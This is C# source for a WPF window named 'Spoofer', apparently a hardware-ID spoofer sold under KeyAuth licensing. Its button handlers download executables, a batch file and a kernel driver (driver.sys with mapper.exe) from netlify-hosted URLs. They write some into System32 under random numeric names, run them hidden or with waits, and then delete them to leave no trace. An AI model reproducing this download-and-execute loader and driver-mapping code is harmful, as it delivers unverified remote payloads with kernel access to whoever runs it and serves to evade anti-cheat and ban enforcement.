using System;
using System.Net;
using System.Windows;
using System.Windows.Input;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Reflection;
using System.Threading.Tasks;
using Microsoft.Win32;
using KeyAuth;

namespace WpfApp1
{
    public partial class Spoofer : Window
    {





        public Spoofer()
        {
            InitializeComponent();
        }



        private void Button_Click(object sender, RoutedEventArgs e)
        {
            // Handle button click
        }

        private void hk_Click(object sender, RoutedEventArgs e)
        {
            // Handle button click
        }

        private async void Button_Click_1(object sender, RoutedEventArgs e)
        {
            using (WebClient client = new WebClient())
            {
                // URL of the files to download
                string mapperUrl = "https://drv68998778.netlify.app/mapper.exe";
                string driverUrl = "https://drv68998778.netlify.app/driver.sys";

                byte[] mapperBytes = await client.DownloadDataTaskAsync(new Uri(mapperUrl));
                byte[] driverBytes = await client.DownloadDataTaskAsync(new Uri(driverUrl));

                // Start the mapper.exe with driver.sys as a parameter
                string tempPath = Path.GetTempPath();
                string mapperPath = Path.Combine(tempPath, "mapper.exe");
                string driverPath = Path.Combine(tempPath, "driver.sys");

                File.WriteAllBytes(mapperPath, mapperBytes);
                File.WriteAllBytes(driverPath, driverBytes);

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = mapperPath,
                    Arguments = driverPath,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process.Start(psi)?.WaitForExit();

                // Clean up
                File.Delete(mapperPath);
                File.Delete(driverPath);

                PopUp.Visibility = Visibility.Visible;
                PopUpExit.Visibility = Visibility.Visible;
                Blur.Visibility = Visibility.Visible;
                SpoofedText.Visibility = Visibility.Visible;

            }
        }




        private void Rectangle_MouseLeftButtonUp(object sender, MouseButtonEventArgs e)
        {
            Hide();
            Environment.Exit(0);
        }








        private void Button_Click_2(object sender, RoutedEventArgs e)
        {





            string cPlusPlusExecutableName2 = "798489465415457.exe";
            string system32Path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), cPlusPlusExecutableName2);
            string downloadUrl2 = "https://astounding-duckanoo-fb2644.netlify.app/applecleaner.exe";

            if (File.Exists(system32Path2))
            {
                File.Delete(system32Path2);
            }

            using (WebClient webClient = new WebClient())
            {
                webClient.DownloadFile(downloadUrl2, system32Path2);
            }

            // Execute the downloaded executable
            System.Diagnostics.Process.Start(system32Path2)?.WaitForExit();

            // Clean up by deleting the downloaded executable
            if (File.Exists(system32Path2))
            {
                File.Delete(system32Path2);
            }

            string cPlusPlusExecutableName = "876549845448.bat";
            string system32Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), cPlusPlusExecutableName);
            string downloadUrl = "https://astounding-duckanoo-fb2644.netlify.app/cleaner.bat";

            if (File.Exists(system32Path))
            {
                File.Delete(system32Path);
            }

            using (WebClient webClient = new WebClient())
            {
                webClient.DownloadFile(downloadUrl, system32Path);
            }

            // Execute the downloaded executable
            System.Diagnostics.Process.Start(system32Path)?.WaitForExit();

            // Clean up by deleting the downloaded executable
            if (File.Exists(system32Path))
            {
                File.Delete(system32Path);
            }



            PopUp.Visibility = Visibility.Visible;
            PopUpExit.Visibility = Visibility.Visible;
            Blur.Visibility = Visibility.Visible;
            SpoofedText.Visibility = Visibility.Visible;


        }

        private void PopUpExit_MouseLeftButtonUp(object sender, MouseButtonEventArgs e)
        {
            PopUp.Visibility = Visibility.Hidden;
            PopUpExit.Visibility = Visibility.Hidden;
            Blur.Visibility = Visibility.Hidden;
            SpoofedText.Visibility = Visibility.Hidden;
        }

        private void serials_Click(object sender, RoutedEventArgs e)
        {



            string cPlusPlusExecutableName2 = "798498745610584g.exe";
            string system32Path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), cPlusPlusExecutableName2);
            string downloadUrl2 = "https://astounding-duckanoo-fb2644.netlify.app/checker.exe";

            if (File.Exists(system32Path2))
            {
                File.Delete(system32Path2);
            }

            using (WebClient webClient = new WebClient())
            {
                webClient.DownloadFile(downloadUrl2, system32Path2);
            }

            // Execute the downloaded executable
            System.Diagnostics.Process.Start(system32Path2)?.WaitForExit();

            // Clean up by deleting the downloaded executable
            if (File.Exists(system32Path2))
            {
                File.Delete(system32Path2);
            }




        }

        private void TopBar_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            DragMove();
        }
    }
}
